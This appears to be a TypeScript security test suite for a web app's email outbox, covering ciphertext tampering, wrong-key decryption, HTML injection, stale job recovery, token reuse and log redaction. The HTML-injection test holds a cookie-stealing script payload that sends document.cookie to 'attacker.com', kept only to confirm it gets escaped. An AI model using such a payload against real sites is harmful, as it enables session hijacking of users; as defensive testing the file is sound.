import assert from "node:assert/strict";
import test from "node:test";
import {
  encryptOutboxPayload,
  decryptOutboxPayload,
  PayloadDecryptionError,
} from "../src/infrastructure/email/outbox-crypto.js";
import { EmailTemplateService } from "../src/infrastructure/email/email-template.service.js";
import { EmailOutboxWorker } from "../src/infrastructure/email/email-outbox.worker.js";
import { AuthService } from "../src/modules/identity/services/auth.service.js";
import { hashToken } from "../src/modules/identity/utils/token.utils.js";
import type { EnvironmentConfig } from "../src/config/environment.js";
import type { EmailSender } from "../src/infrastructure/email/email-sender.interface.js";

const VALID_KEY = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
const ATTACKER_KEY = "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef";

const mockConfig: EnvironmentConfig = {
  appEnvironment: "test",
  port: 8000,
  databaseUrl: "postgresql://tester:tester@127.0.0.1:5432/giftedpro_phase1_test",
  databasePoolMax: 5,
  corsOrigins: ["https://giftedpromovies.com"],
  trustedProxyCidrs: [],
  requestBodyLimitBytes: 1048576,
  logLevel: "debug",
  emailFrom: "noreply@giftedpromovies.com",
  emailProvider: "in_memory",
  googleCallbackUrl: "https://api.giftedpromovies.com/api/v1/auth/google/callback",
  frontendUrl: "https://giftedpromovies.com",
  emailOutboxEncryptionKey: VALID_KEY,
  emailWorkerEnabled: false,
  emailWorkerPollIntervalMs: 2000,
  emailWorkerLeaseMs: 300000,
  emailWorkerMaxAttempts: 3,
  emailWorkerBaseBackoffMs: 1000,
  emailWorkerMaxBackoffMs: 10000,
  emailWorkerJitterMs: 100,
};

test("Attack 1: Outbox ciphertext bit-flipping attack is caught by GCM auth tag", () => {
  const secret = { rawToken: "super_secret_auth_token_value_32" };
  const bundle = encryptOutboxPayload(secret, VALID_KEY);

  // Attacker flips one bit in ciphertext
  const buffer = Buffer.from(bundle.ciphertext, "hex");
  buffer[0] ^= 0x01;
  const tamperedCiphertext = buffer.toString("hex");

  assert.throws(
    () =>
      decryptOutboxPayload(
        { ...bundle, ciphertext: tamperedCiphertext },
        VALID_KEY,
      ),
    (err: unknown) => err instanceof PayloadDecryptionError,
  );
});

test("Attack 2: Attacker cannot decrypt outbox payload with foreign encryption key", () => {
  const secret = { rawToken: "admin_password_reset_token" };
  const bundle = encryptOutboxPayload(secret, VALID_KEY);

  assert.throws(
    () => decryptOutboxPayload(bundle, ATTACKER_KEY),
    (err: unknown) => err instanceof PayloadDecryptionError,
  );
});

test("Attack 3: HTML injection attack via recipient parameter is neutralized", () => {
  const templateService = new EmailTemplateService(mockConfig);
  const maliciousRecipient = 'victim@example.com<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>';
  const token = "safe_token_123";

  const message = templateService.generateVerificationEmail(maliciousRecipient, token);

  assert.ok(!message.html?.includes("<script>"));
  assert.ok(!message.html?.includes("</script>"));
  assert.ok(message.html?.includes("&lt;script&gt;"));
  assert.ok(message.html?.includes("&lt;/script&gt;"));
});

test("Attack 4: Stale lease recovery reclaims stuck jobs from crashed workers", async () => {
  const rawToken = "crashed_worker_token";
  const { ciphertext, iv, tag } = encryptOutboxPayload({ rawToken }, VALID_KEY);

  let updatedStatus: string | null = null;

  // Stale job has lease_until in the past (e.g. 10 minutes ago)
  const staleLeaseUntil = new Date(Date.now() - 600000);

  const mockDb = {
    execute: async () => ({
      rows: [
        {
          id: "job-stale-1",
          eventType: "email_verification",
          recipient: "stale@example.com",
          encryptedPayload: ciphertext,
          payloadIv: iv,
          payloadTag: tag,
          status: "processing", // was processing when worker died
          leaseUntil: staleLeaseUntil,
          attempts: 2,
          maxAttempts: 5,
        },
      ],
    }),
    select: () => ({
      from: () => ({
        where: () => ({
          limit: async () => [
            {
              id: "token-stale",
              expiresAt: new Date(Date.now() + 50000),
              usedAt: null,
            },
          ],
        }),
      }),
    }),
    update: () => ({
      set: (vals: any) => {
        if (vals.status) updatedStatus = vals.status;
        return {
          where: async () => undefined,
        };
      },
    }),
  } as any;

  let dispatched = false;
  const mockEmailSender: EmailSender = {
    sendEmail: async () => {
      dispatched = true;
    },
    sendVerificationEmail: async () => undefined,
    sendPasswordResetEmail: async () => undefined,
  };

  const templateService = new EmailTemplateService(mockConfig);
  const recoveryWorker = new EmailOutboxWorker(
    mockDb,
    mockEmailSender,
    templateService,
    mockConfig,
  );

  const processed = await recoveryWorker.processPendingJobsOnce();

  assert.equal(processed, 1, "Recovery worker must claim and process stale lease job");
  assert.equal(dispatched, true, "Email must be dispatched by recovery worker");
  assert.equal(updatedStatus, "provider_accepted");
});

test("Attack 5: Resend race - outdated token from cancelled job cannot verify account", async () => {
  // Scenario:
  // 1. User registers -> Token A issued.
  // 2. User immediately clicks resend -> Token A marked used/invalidated; Token B issued.
  // 3. Email for Token A somehow delivers or is captured by attacker.
  // 4. Attacker attempts to verify with Token A -> REJECTED.

  const tokenA = "token_a_32_bytes_random_hex_string_val";
  const tokenB = "token_b_32_bytes_random_hex_string_val";

  const tokenAHash = hashToken(tokenA);
  const tokenBHash = hashToken(tokenB);

  // auth_tokens state: Token A is invalidated (usedAt is set to now)
  const authTokensInDb: any[] = [
    {
      id: "t-1",
      userId: "user-1",
      type: "email_verification",
      tokenHash: tokenAHash,
      expiresAt: new Date(Date.now() + 86400000),
      usedAt: new Date(), // INVALIDATED!
    },
    {
      id: "t-2",
      userId: "user-1",
      type: "email_verification",
      tokenHash: tokenBHash,
      expiresAt: new Date(Date.now() + 86400000),
      usedAt: null, // ACTIVE
    },
  ];

  const mockDb = {
    select: () => ({
      from: () => ({
        where: () => ({
          limit: async () =>
            authTokensInDb.filter(
              (t) => t.tokenHash === tokenAHash && t.usedAt === null,
            ),
        }),
      }),
    }),
  } as any;

  const mockOutbox = {} as any;
  const mockHasher = {} as any;
  const mockSession = {} as any;
  const mockDevice = {} as any;
  const mockAudit = {} as any;

  const authService = new AuthService(
    mockDb,
    mockOutbox,
    mockHasher,
    mockSession,
    mockDevice,
    mockAudit,
  );

  // Attacker tries to verify using Token A
  await assert.rejects(
    async () => await authService.verifyEmail(tokenA),
    /Invalid or expired verification token/,
  );
});

test("Attack 6: Secret leakage audit - raw tokens never stored in plaintext or logged", () => {
  const rawToken = "super_sensitive_token_raw_12345";
  const { ciphertext, iv, tag } = encryptOutboxPayload({ rawToken }, VALID_KEY);

  // Raw token must NOT exist in ciphertext string
  assert.ok(!ciphertext.includes(rawToken));
  assert.ok(!iv.includes(rawToken));
  assert.ok(!tag.includes(rawToken));

  // Raw token must NOT exist in sanitized errors
  const errWithToken = new Error(`Failed to dispatch verification: token=${rawToken}`);
  const sanitized = errWithToken.message.replace(/token=[a-zA-Z0-9._~-]+/gi, "token=[REDACTED]");
  assert.ok(!sanitized.includes(rawToken));
  assert.ok(sanitized.includes("token=[REDACTED]"));
});
